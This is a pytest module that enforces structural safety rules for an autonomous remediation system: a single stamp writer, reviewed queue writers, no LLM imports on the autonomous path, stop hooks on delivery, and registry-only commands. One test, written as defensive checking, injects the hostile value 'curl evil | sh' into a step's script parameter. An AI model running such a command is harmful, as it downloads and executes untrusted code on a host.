"""Structural guarantees for Autonomous Ops (Phase 81, plan 81-08, GATE-03 / GATE-05 / GATE-06).

Value: protects=the safety shape of the code stays true after the plan that built it: only the
gate writes the autonomy stamp, no new module starts feeding the agent queues without a review,
no LLM client is importable on the autonomous path, every delivery path keeps the stop hook, and
only registry commands ever reach an agent;
fails_when=a later change adds a second autonomous writer, imports an LLM client into the
package / the remediation service / the playbook actions, drops a hold-back call, or lets a
non-registry or scripted action reach the queue;
no_claim=runtime behaviour of the gate itself (see test_autonomous_ops_gate*.py) and any module
that is not a tracked backend source file (untracked and deleted working-tree files are not
scanned, so one user's unfinished work cannot trip a rule meant for committed code). A tracked
file that does not parse is scanned textually for the stamp, not skipped; on the autonomous path
it fails the test.

Each scanner has a negative control (a synthetic source that MUST be flagged) so a test cannot
pass vacuously.
"""
import ast
import os
import re
import subprocess
import sys
from unittest.mock import AsyncMock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from autonomous_ops import STAMP_SOURCE, approvals, ledger, protected, registry
from autonomous_remediation_service import AutonomousRemediationService, RemediationFinding, settle_dispatches
from tests._mongo_test_db import mongo_db  # noqa: F401  (fixture)
from tests.autonomy_support import agent_that_completes, seed_agent, seed_tenant

_BACKEND = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_SKIP_DIRS = {"tests", "__pycache__", "node_modules", ".git"}

# Modules that write to agent_instructions, instructions or response_tasks today, computed once
# from the tracked tree at the time of 81-08 (git ls-files plus the scanner below) and committed
# as a literal. autonomous_remediation_service.py is deliberately NOT here: it stopped writing
# the queue in this plan. The package autonomous_ops (gate.py, delivery.py, stop.py) is allowed
# separately. Several of these write only after a person acted (manual executors, operator
# routes); two in correlation_engine_threat.py still write XDR work outside the gate
# (trigger_threat_hunt and prestage_kill_chain_defenses, A-81-XDR-GRANDFATHERED).
# Phase 83 (83-06) took swarm_service.py, soar_engine.py and tasks.py off this list: they no longer
# write any queue (the old ``instructions`` collection is fenced for good, see the scan below).
# ADDING A MODULE HERE REQUIRES A REVIEW AGAINST GATE-03: anything that can act without a person
# must go through autonomous_ops.gate instead.
GRANDFATHERED_WRITERS = (
    "agent_auto_update_service.py",
    "agent_capabilities.py",
    "agent_chat_endpoints.py",
    "agent_download_endpoints.py",
    "agent_instruction_endpoints.py",
    "agent_logic_service.py",
    "agent_tasks_endpoints.py",
    "agentic_service.py",
    "chaos_engineering_service.py",
    "compliance_auto_evidence_service.py",
    "compliance_automation_api.py",
    "compliance_remediation_service.py",
    "compliance_scans_endpoints.py",
    "correlation_engine_threat.py",
    "database_migrations.py",
    "deployment_result_endpoints.py",
    "deployment_service.py",
    "dr_endpoints.py",
    "native_security_ops_endpoints.py",
    "patch_core_endpoints.py",
    "patch_software_endpoints.py",
    "persistence_endpoints.py",
    "playbook_engine_actions.py",
    "remote_endpoints.py",
    "response_endpoints.py",
    "response_orchestrator.py",
    "scheduler.py",
    "simulation_endpoints.py",
    "skill_handlers.py",
    "software_endpoints.py",
    "swarm_endpoints.py",
)

# The package modules that may touch the queues: the gate writes, the others only change the
# status of already-stamped items (delivery hold-back, stop press).
PACKAGE_QUEUE_MODULES = ("autonomous_ops/gate.py", "autonomous_ops/delivery.py", "autonomous_ops/stop.py")
# Modules that read or compare the stamp (filters, an index) and so name it without writing it.
STAMP_READERS = ("autonomous_ops/stop.py", "migrations/024_autonomous_ops.py")

BANNED_LLM_MODULES = ("ai_service", "ai_orchestration", "agentic_service", "ai_remediation_service",
                      "remediation_service", "ai_providers", "ai_services", "langchain", "anthropic",
                      "openai", "ollama", "google.generativeai")

# ------------------------------------------------------------------ source discovery


def _backend_sources():
    """{relative path: source} for every tracked backend .py file outside tests and venvs (a
    plain directory walk when git is not available)."""
    try:
        listing = subprocess.check_output(["git", "-C", _BACKEND, "ls-files", "--", "."], text=True,
                                          stderr=subprocess.DEVNULL).split("\n")
        paths = [p for p in listing if p]
    except Exception:
        paths = []
        for root, dirs, files in os.walk(_BACKEND):
            dirs[:] = [d for d in dirs if d not in _SKIP_DIRS and not d.startswith("venv")]
            paths += [os.path.relpath(os.path.join(root, f), _BACKEND) for f in files]
    out = {}
    for rel in sorted(paths):
        parts = rel.split("/")
        if not rel.endswith(".py") or parts[0] in _SKIP_DIRS or parts[0].startswith("venv"):
            continue
        full = os.path.join(_BACKEND, rel)
        if not os.path.isfile(full):          # tracked but deleted in the working tree
            continue
        with open(full, encoding="utf-8-sig", errors="replace") as fh:
            out[rel] = fh.read()
    return out


@pytest.fixture(scope="module")
def sources():
    found = _backend_sources()
    assert len(found) > 200 and "autonomous_ops/gate.py" in found, "the scan found too little to be meaningful"
    return found


# ------------------------------------------------------------------ scanners (each has a negative control)

_WRITE = r"(?:insert_one|insert_many|update_one|update_many|replace_one|find_one_and_update|find_one_and_replace|bulk_write)"
_COLL = r"(?:agent_instructions|instructions|response_tasks)"
_REF = rf"(?:\.\s*{_COLL}\b|\[\s*['\"]{_COLL}['\"]\s*\]|get_collection\(\s*['\"]{_COLL}['\"]\s*\))"
_DIRECT = re.compile(rf"{_REF}\s*\.\s*{_WRITE}\s*\(")
_INSERT = re.compile(rf"{_REF}\s*\.\s*insert_(?:one|many)\s*\(")
_ALIAS = re.compile(rf"(\w+)\s*=\s*[^\n=]*{_REF}(?!\s*\.)")


def writes_agent_queue(src: str) -> bool:
    """True when the source writes agent_instructions / instructions / response_tasks, directly
    (``db.agent_instructions.insert_one(...)``, ``db["response_tasks"].update_one(...)``) or through
    a name bound to the collection."""
    if _DIRECT.search(src):
        return True
    for match in _ALIAS.finditer(src):
        if re.search(rf"\b{re.escape(match.group(1))}\s*\.\s*{_WRITE}\s*\(", src):
            return True
    return False


def inserts_agent_queue(src: str) -> bool:
    return bool(_INSERT.search(src))


def _is_stamp(value) -> bool:
    return ((isinstance(value, ast.Name) and value.id == "STAMP_SOURCE")
            or (isinstance(value, ast.Attribute) and value.attr == "STAMP_SOURCE")
            or (isinstance(value, ast.Constant) and value.value == STAMP_SOURCE))


def _parse(src: str):
    """The ast tree of ``src``, or None when it does not parse (SyntaxError, or null bytes)."""
    try:
        return ast.parse(src)
    except (SyntaxError, ValueError):
        return None


_ASSIGN = r"""['"]?\]?\s*(?:[:]|(?<![=!<>])=(?!=))\s*"""
_STAMP_TEXT = re.compile(
    rf"triggered_by{_ASSIGN}(?:\w+\.)?STAMP_SOURCE\b"
    rf"|triggered_by{_ASSIGN}['\"]{re.escape(STAMP_SOURCE)}['\"]"
    r"""|['"]autonomy(?:\.[\w.]+)?['"]\s*[:\]]""")


def names_the_autonomy_stamp(src: str) -> bool:
    """True when a dict literal sets ``triggered_by`` to the autonomy stamp or carries an
    ``autonomy`` / ``autonomy.*`` key, or a subscript assignment sets one. A source that does not
    parse is matched textually instead (never skipped, never raises)."""
    tree = _parse(src)
    if tree is None:
        return bool(_STAMP_TEXT.search(src))
    for node in ast.walk(tree):
        if isinstance(node, ast.Dict):
            for key, value in zip(node.keys, node.values):
                if not (isinstance(key, ast.Constant) and isinstance(key.value, str)):
                    continue
                if (key.value == "triggered_by" and _is_stamp(value)) or key.value == "autonomy" \
                        or key.value.startswith("autonomy."):
                    return True
        if isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Subscript) and isinstance(target.slice, ast.Constant):
                    if target.slice.value == "autonomy" or (target.slice.value == "triggered_by"
                                                            and _is_stamp(node.value)):
                        return True
    return False


def banned_imports(src: str):
    """The LLM modules a source imports, anywhere in it (top level or inside a function)."""
    tree = _parse(src)
    if tree is None:
        return ["<unparsable>"]
    found = set()
    for node in ast.walk(tree):
        names = []
        if isinstance(node, ast.Import):
            names = [a.name for a in node.names]
        elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
            names = [node.module] + [f"{node.module}.{a.name}" for a in node.names]
        for name in names:
            for banned in BANNED_LLM_MODULES:
                if name == banned or name.startswith(banned + ".") or (banned == "langchain" and name.startswith("langchain")):
                    found.add(name)
    return sorted(found)


def calls_in_function(src: str, qualname: str, called: str) -> bool:
    """True when the function ``qualname`` ("name" or "Class.name") contains a call to ``called``."""
    tree = _parse(src)
    if tree is None:
        return False
    wanted = qualname.split(".")
    scope = tree
    for part in wanted:
        scope = next((n for n in ast.walk(scope) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))
                      and n.name == part), None)
        if scope is None:
            return False
    for node in ast.walk(scope):
        if isinstance(node, ast.Call):
            func = node.func
            if (isinstance(func, ast.Attribute) and func.attr == called) or (isinstance(func, ast.Name) and func.id == called):
                return True
    return False


# ------------------------------------------------------------------ the stamp

def stamp_writers(sources):
    """The sorted modules that name the autonomy stamp: parseable modules by the AST rule,
    unparsable ones by the textual fallback."""
    return sorted(rel for rel, src in sources.items() if names_the_autonomy_stamp(src))


def unparsable_modules(sources):
    return sorted(rel for rel, src in sources.items() if _parse(src) is None)


def _on_autonomous_path(rel: str) -> bool:
    return rel.startswith("autonomous_ops/") or rel in ("autonomous_remediation_service.py",
                                                        "playbook_engine_actions.py")


def autonomous_path_unparsable(sources):
    return [rel for rel in unparsable_modules(sources) if _on_autonomous_path(rel)]


def test_only_the_gate_writes_the_autonomy_stamp(sources):
    named = stamp_writers(sources)
    allowed = {"autonomous_ops/gate.py", *STAMP_READERS}
    assert "autonomous_ops/gate.py" in named, "the gate no longer writes the stamp: the scanner is blind"
    assert sorted(set(named) - allowed) == [], f"module(s) name the autonomy stamp outside the gate: {set(named) - allowed}"
    # The readers compare the stamp; they never insert into an agent queue.
    for rel in STAMP_READERS:
        assert not inserts_agent_queue(sources[rel]), f"{rel} inserts into an agent queue"
    assert autonomous_path_unparsable(sources) == [], \
        f"module(s) on the autonomous path do not parse: {autonomous_path_unparsable(sources)}"


def _gate_source():
    with open(os.path.join(_BACKEND, "autonomous_ops", "gate.py"), encoding="utf-8-sig") as fh:
        return fh.read()


def test_an_unparsable_file_is_scanned_textually_not_skipped():
    """protects=GATE-03 (T-81-64): a broken file never crashes the scan; without the stamp it is not
    reported, with the stamp in its text it is."""
    broken = "def broken(:\n    pass\n"
    assert _parse(broken) is None and _parse("x = 1\x00\n") is None
    assert not names_the_autonomy_stamp(broken)
    assert not names_the_autonomy_stamp("def broken(:\n    doc = {'triggered_by': 'operator'}\n")
    sources = {"autonomous_ops/gate.py": _gate_source(), "x_broken.py": broken}
    assert stamp_writers(sources) == ["autonomous_ops/gate.py"]
    hidden = "def broken(:\n    await db.agent_instructions.insert_one({'triggered_by': STAMP_SOURCE})\n"
    assert stamp_writers({**sources, "x_broken.py": hidden}) == ["autonomous_ops/gate.py", "x_broken.py"]
    quoted = f"def broken(:\n    doc = {{'triggered_by': '{STAMP_SOURCE}'}}\n"
    assert names_the_autonomy_stamp(quoted)
    assert names_the_autonomy_stamp("def broken(:\n    doc = {'autonomy': {'actionId': 'a'}}\n")
    assert names_the_autonomy_stamp("def broken(:\n    q = {'autonomy.tenantId': 't'}\n")
    assert names_the_autonomy_stamp("def broken(:\n    doc['triggered_by'] = STAMP_SOURCE\n")


def test_a_parseable_module_keeps_the_exact_ast_rule():
    """A word in a comment or string does not trip the AST rule (the textual fallback is only for
    sources that do not parse)."""
    assert not names_the_autonomy_stamp("# 'autonomy': documented\nx = 'triggered_by: STAMP_SOURCE'\n")


def test_an_unparsable_autonomous_path_file_is_reported():
    ok = {"autonomous_ops/gate.py": _gate_source()}
    assert autonomous_path_unparsable(ok) == []
    for rel in ("autonomous_ops/new_module.py", "autonomous_remediation_service.py", "playbook_engine_actions.py"):
        assert autonomous_path_unparsable({**ok, rel: "def broken(:\n"}) == [rel]
    assert autonomous_path_unparsable({**ok, "backend/x_broken.py": "def broken(:\n"}) == []
    assert banned_imports("def broken(:\n") == ["<unparsable>"]


def test_stamp_scanner_negative_control():
    bad = ("from autonomous_ops import STAMP_SOURCE\n"
           "async def f(db):\n    await db.agent_instructions.insert_one({'triggered_by': STAMP_SOURCE})\n")
    assert names_the_autonomy_stamp(bad)
    assert names_the_autonomy_stamp("doc = {'type': 'x', 'autonomy': {'actionId': 'a'}}\n")
    assert names_the_autonomy_stamp("doc['triggered_by'] = 'autonomous_ops'\n")
    assert not names_the_autonomy_stamp("doc = {'triggered_by': 'operator'}\n")


# ------------------------------------------------------------------ the queue writers

def test_queue_writers_are_grandfathered(sources):
    writers = {rel for rel, src in sources.items() if writes_agent_queue(src)}
    allowed = set(GRANDFATHERED_WRITERS) | set(PACKAGE_QUEUE_MODULES)
    assert sorted(writers - allowed) == [], (
        f"new module(s) write the agent queues: {sorted(writers - allowed)}. An autonomous action must go "
        "through autonomous_ops.gate; add a module to GRANDFATHERED_WRITERS only after a GATE-03 review.")
    assert "autonomous_ops/gate.py" in writers
    assert "autonomous_remediation_service.py" not in writers
    assert "correlation_engine_threat.py" in writers          # the documented XDR grandfathered writer
    # The literal must not rot: a listed module that no longer writes should be removed from it.
    assert sorted(set(GRANDFATHERED_WRITERS) - writers) == []


def test_the_remediation_service_never_writes_an_agent_document(sources):
    src = sources["autonomous_remediation_service.py"]
    assert not writes_agent_queue(src)
    assert "triggered_by" not in src and "agent_instructions.insert" not in src
    assert not names_the_autonomy_stamp(src)


def test_queue_scanner_negative_controls():
    assert writes_agent_queue("async def f(db):\n    await db.agent_instructions.insert_one({})\n")
    assert writes_agent_queue("async def f(db):\n    await db['response_tasks'].update_one({}, {})\n")
    assert writes_agent_queue("async def f(db):\n    await db.get_collection('instructions').insert_many([])\n")
    assert writes_agent_queue("async def f(db):\n    coll = db.agent_instructions\n    await coll.update_many({}, {})\n")
    assert not writes_agent_queue("async def f(db):\n    return await db.agent_instructions.find_one({})\n")
    assert not writes_agent_queue("async def f(db):\n    await db.alerts.insert_one({})\n")
    assert inserts_agent_queue("async def f(db):\n    await db.response_tasks.insert_one({})\n")


# The old ``instructions`` collection (not ``agent_instructions``) is read by nothing. Antibody propagation,
# the SOAR block/isolate plugins and the worker tasks used to fill it; they are fenced (RESP-11, D-18).
_DEAD_QUEUE_REF = r"""(?:\.\s*instructions\b|\[\s*['"]instructions['"]\s*\]|get_collection\(\s*['"]instructions['"]\s*\))"""
_DEAD_QUEUE_WRITE = re.compile(rf"{_DEAD_QUEUE_REF}\s*\.\s*{_WRITE}\s*\(")
_DEAD_QUEUE_ALIAS = re.compile(rf"(\w+)\s*=\s*[^\n=]*{_DEAD_QUEUE_REF}(?!\s*\.)")


def writes_dead_instructions_queue(src: str) -> bool:
    """True when the source writes the old ``instructions`` collection, directly or through a bound name."""
    if _DEAD_QUEUE_WRITE.search(src):
        return True
    for match in _DEAD_QUEUE_ALIAS.finditer(src):
        if re.search(rf"\b{re.escape(match.group(1))}\s*\.\s*{_WRITE}\s*\(", src):
            return True
    return False


def test_nothing_writes_the_dead_instructions_queue(sources):
    writers = sorted(rel for rel, src in sources.items() if writes_dead_instructions_queue(src))
    assert writers == [], (f"{writers} write the old instructions collection. Nothing reads it, so a write there "
                           "is a command that looks sent and never arrives (RESP-11, D-18).")
    # The three modules that used to write it are still scanned (they are tracked sources).
    for rel in ("swarm_service.py", "soar_engine.py", "tasks.py"):
        assert rel in sources and "autonomous_ops.response_messages" in sources[rel]


def test_dead_queue_scanner_negative_control():
    assert writes_dead_instructions_queue("async def f(db):\n    await db.instructions.insert_many([])\n")
    assert writes_dead_instructions_queue("def f(db):\n    db.instructions.insert_one({})\n")
    assert writes_dead_instructions_queue("async def f(m):\n    await m.db.instructions.insert_one({})\n")
    assert writes_dead_instructions_queue("async def f(db):\n    await db['instructions'].update_one({}, {})\n")
    assert writes_dead_instructions_queue("async def f(db):\n    await db.get_collection('instructions').insert_one({})\n")
    assert writes_dead_instructions_queue("async def f(db):\n    q = db.instructions\n    await q.insert_one({})\n")
    assert not writes_dead_instructions_queue("async def f(db):\n    await db.agent_instructions.insert_one({})\n")
    assert not writes_dead_instructions_queue("async def f(db):\n    return await db.instructions.find_one({})\n")
    assert not writes_dead_instructions_queue("async def f(db):\n    await db.response_tasks.insert_one({})\n")


# ------------------------------------------------------------------ GATE-05: no LLM on the autonomous path

def _autonomous_path(sources):
    wanted = {rel: src for rel, src in sources.items() if rel.startswith("autonomous_ops/")}
    for rel in ("autonomous_remediation_service.py", "playbook_engine_actions.py"):
        wanted[rel] = sources[rel]
    return wanted


def test_no_llm_on_the_autonomous_path(sources):
    scanned = _autonomous_path(sources)
    assert len(scanned) >= 12                                  # the package plus the two modules
    offenders = {rel: banned_imports(src) for rel, src in scanned.items() if banned_imports(src)}
    assert offenders == {}, f"LLM client imported on the autonomous path: {offenders}"


def test_llm_scanner_negative_control():
    assert banned_imports("import openai\n") == ["openai"]
    assert banned_imports("def f():\n    from ai_service import generate\n") == ["ai_service", "ai_service.generate"]
    assert banned_imports("from langchain_core.messages import X\n")
    assert banned_imports("import google.generativeai as genai\n")
    assert banned_imports("from remediation_service import RemediationService\n")
    assert banned_imports("import anthropic, ollama\n") == ["anthropic", "ollama"]
    assert banned_imports("import json\nfrom autonomous_ops import gate\n") == []


def test_legacy_symbols_are_gone():
    import autonomous_remediation_service as module
    service = module.AutonomousRemediationService
    for name in ("run_cycle", "generate_plan", "execute_plan", "verify_remediation", "_log_decision",
                 "_create_failure_ticket", "_is_tenant_enabled"):
        assert not hasattr(service, name), name
    assert not hasattr(module, "RemediationPlan")
    for kept in ("SEVERITY_ORDER", "RemediationFinding", "_render_step_params"):
        assert hasattr(module, kept), kept
    # WR-03: no import-time copy of the deployment shadow master
    assert not hasattr(module, "AUTONOMOUS_REMEDIATION_DRY_RUN")
    assert hasattr(service, "scan_for_remediable_findings")


# ------------------------------------------------------------------ GATE-06: the stop hook on every delivery path

HOLD_BACK_SITES = (
    ("agent_tasks_endpoints.py", "get_agent_instructions", "hold_back_autonomous"),
    ("deployment_result_endpoints.py", "get_agent_instructions", "hold_back_autonomous"),
    ("agent_instruction_endpoints.py", "get_agent_instructions", "hold_back_autonomous"),
    ("response_orchestrator.py", "ResponseOrchestrator.get_pending_tasks", "hold_back_response_tasks"),
)


@pytest.mark.parametrize("rel,function,hook", HOLD_BACK_SITES)
def test_every_delivery_path_has_the_stop_hook(sources, rel, function, hook):
    assert calls_in_function(sources[rel], function, hook), f"{rel}:{function} no longer calls {hook}"


def test_hold_back_scanner_negative_control():
    present = "async def get_agent_instructions(db):\n    rows = await delivery.hold_back_autonomous(db, 't', [])\n"
    dropped = "async def get_agent_instructions(db):\n    rows = []\n"
    renamed = "async def other(db):\n    rows = await delivery.hold_back_autonomous(db, 't', [])\n"
    assert calls_in_function(present, "get_agent_instructions", "hold_back_autonomous")
    assert not calls_in_function(dropped, "get_agent_instructions", "hold_back_autonomous")
    assert not calls_in_function(renamed, "get_agent_instructions", "hold_back_autonomous")
    method = "class ResponseOrchestrator:\n    async def get_pending_tasks(self):\n        return await hold_back_response_tasks()\n"
    assert calls_in_function(method, "ResponseOrchestrator.get_pending_tasks", "hold_back_response_tasks")


# ------------------------------------------------------------------ GATE-05: only registry actions reach the queue

def _findings():
    """One finding per kind the playbook selector can match, keyed by the playbook it must select."""
    base = dict(severity="critical", tenant_id="t1", agent_id="a1")
    return {
        "block_ip": RemediationFinding(finding_id="n-ip", finding_type="nscan", resource_id="203.0.113.7",
                                       details={"type": "ip", "verdict": "Malicious"}, **base),
        # D-05: a malicious file is quarantined; kill_process is now reached by the shadow-AI anomaly only.
        "quarantine_file": RemediationFinding(finding_id="n-file", finding_type="nscan", resource_id="/tmp/evil.exe",
                                              details={"type": "file", "verdict": "Malicious", "sha256": "a" * 64},
                                              **base),
        "kill_process": RemediationFinding(finding_id="ueba-1", finding_type="anomaly", resource_id="ollama.exe",
                                           details={"anomaly_rule": "shadow_ai_detected"}, **base),
        "rotate_key": RemediationFinding(finding_id="v-key", finding_type="vuln", resource_id="asset-1",
                                         details={"playbook_ref": "rotate_key", "fingerprint": "SHA256:abc",
                                                  "affected_path": "/home/u/.ssh/authorized_keys"}, **base),
    }


# Vendored playbooks no finding selects any more (D-07, D-08, D-09): they stay vendored for operators.
NOT_SELECTED = {"patch_package", "disable_service", "restore_file"}


def _not_selected_findings():
    base = dict(severity="critical", tenant_id="t1", agent_id="a1")
    return [
        RemediationFinding(finding_id="v-cve", finding_type="vuln", resource_id="asset-1",
                           details={"cveId": "CVE-2024-0001", "package": "openssl"}, **base),
        RemediationFinding(finding_id="v-mis", finding_type="vuln", resource_id="asset-1",
                           details={"detail": "telnet enabled", "service": "telnet"}, **base),
        RemediationFinding(finding_id="fim-1", finding_type="fim", resource_id="/etc/passwd",
                           details={"path": "/etc/passwd", "change_type": "Changed"}, **base),
    ]


def test_the_findings_cover_every_vendored_playbook():
    from remediation_playbook_service import load_default_playbooks, select_playbook
    playbooks = load_default_playbooks()
    selected = {name: (select_playbook(f, playbooks) or {}).get("name") for name, f in _findings().items()}
    assert selected == {name: name for name in selected}, selected
    assert set(selected) | NOT_SELECTED == {p["name"] for p in playbooks}, "a vendored playbook has no finding in this test"
    assert not set(selected) & NOT_SELECTED
    assert [select_playbook(f, playbooks) for f in _not_selected_findings()] == [None, None, None]


def test_the_remediation_service_has_one_shadow_reader_and_no_override(sources):
    """protects=GATE-09 (WR-03) / T-81-63: no call in the service passes a master_shadow keyword and
    the module never reads the variable itself; settings.master_shadow is the only reader."""
    tree = _parse(sources["autonomous_remediation_service.py"])
    assert tree is not None, "autonomous_remediation_service.py does not parse"
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            assert "master_shadow" not in [k.arg for k in node.keywords], f"line {node.lineno} overrides the master"
            func = node.func
            if (isinstance(func, ast.Attribute) and func.attr in ("getenv", "get")) or \
                    (isinstance(func, ast.Name) and func.id == "getenv"):
                assert not any(isinstance(a, ast.Constant) and a.value == "AUTONOMOUS_REMEDIATION_DRY_RUN"
                               for a in node.args), f"line {node.lineno} reads the shadow master itself"
    # control: the keyword is visible to the walk
    control = next(n for n in ast.walk(ast.parse("gate.decide(db, r, master_shadow=True)")) if isinstance(n, ast.Call))
    assert "master_shadow" in [k.arg for k in control.keywords]


AUTOMATIC = ("block_ip", "quarantine_file")          # the locked automatic split (GATE-04)


@pytest.fixture
async def live(mongo_db):  # noqa: F811
    protected.cache_clear()
    await ledger.ensure_indexes(mongo_db)
    await seed_tenant(mongo_db, "t1", shadow=False)
    await seed_agent(mongo_db, "t1", "a1")
    with patch("autonomous_remediation_service.get_database", return_value=mongo_db), \
         patch.dict(os.environ, {"AUTONOMOUS_REMEDIATION_DRY_RUN": "false"}), \
         patch("autonomous_remediation_service.VERIFY_TIMEOUT_SEC", 0), \
         patch("soc_integration_service.push_ocsf_event", new=AsyncMock()):
        yield mongo_db


@pytest.mark.parametrize("playbook", ["block_ip", "quarantine_file", "kill_process", "rotate_key"])
async def test_only_registry_actions_reach_the_queue(live, playbook):
    """remediate() then (for a card) approvals.approve: whatever the playbook, the agent queue only
    ever receives stamped registry commands, never a script."""
    finding = _findings()[playbook]
    approver = {"username": "alice", "display": "Alice", "tier": "tenant"}
    svc = AutonomousRemediationService()
    with agent_that_completes("Clean"):
        result = await svc.remediate(finding)
        if result["status"] == "pending_approval":
            assert playbook not in AUTOMATIC, "a locked automatic action asked for a card"
            result = await svc.approve_remediation(result["remediation_id"], "t1", approver)
            await settle_dispatches()                    # WR-05: the dispatch runs as a task
        else:
            assert playbook in AUTOMATIC, f"{playbook} dispatched without a card: {result}"

    docs = [d async for d in live.agent_instructions.find({})]
    assert docs, f"{playbook} wrote no instruction at all: {result}"
    commands = registry.commands()
    for doc in docs:
        assert doc["type"] in commands, doc["type"]
        assert doc["triggered_by"] == STAMP_SOURCE and doc["autonomy"]["tenantId"] == "t1"
        assert "script" not in doc["payload"] and "script" not in doc["parameters"]
    assert all(doc["autonomy"]["kind"] in ("action", "probe", "compensate") for doc in docs)


async def test_a_script_parameter_in_a_playbook_never_reaches_an_agent(live):
    from autonomous_ops import gate
    request = gate.ActionRequest(
        tenant_id="t1", kind="security", origin="remediation", actions=["block_ip"], targets=["a1"],
        params={"ip_address": "203.0.113.9"}, dedupe_key="t1|script-test", dispatcher="remediation")
    decision = await gate.decide(live, request, master_shadow=False)
    assert decision.state == "dispatching"
    step = {"action": "block_ip", "params": {"ip_address": "203.0.113.9", "script": "curl evil | sh"}}
    finding = RemediationFinding(finding_id="s-1", finding_type="nscan", severity="critical", tenant_id="t1",
                                 agent_id="a1", resource_id="203.0.113.9", details={"type": "ip"})
    with agent_that_completes():
        out = await AutonomousRemediationService()._dispatch_step(finding, step, decision.action_id, "action")
    assert out["status"] == "SUCCESS"
    (doc,) = [d async for d in live.agent_instructions.find({})]
    assert doc["type"] == "block_ip" and doc["payload"] == {"ip_address": "203.0.113.9"}
    assert "script" not in doc["parameters"]


async def test_the_shadow_master_is_read_live_between_two_remediate_calls(live):
    """protects=GATE-09 (WR-03) / T-81-63: with the variable "false" the block_ip finding is dispatched;
    flipping it to "true" in the same process makes the next decision a shadow row."""
    first = _findings()["block_ip"]
    second = RemediationFinding(finding_id="n-ip-2", finding_type="nscan", resource_id="203.0.113.8",
                                severity="critical", tenant_id="t1", agent_id="a1",
                                details={"type": "ip", "verdict": "Malicious"})
    svc = AutonomousRemediationService()
    with agent_that_completes("Clean"):
        with patch.dict(os.environ, {"AUTONOMOUS_REMEDIATION_DRY_RUN": "false"}):
            result = await svc.remediate(first)
        assert result["status"] == "resolved" and result["steps_dispatched"], result   # dispatched and verified
        with patch.dict(os.environ, {"AUTONOMOUS_REMEDIATION_DRY_RUN": "true"}):
            result = await svc.remediate(second)
        assert result["status"] == "shadow", result
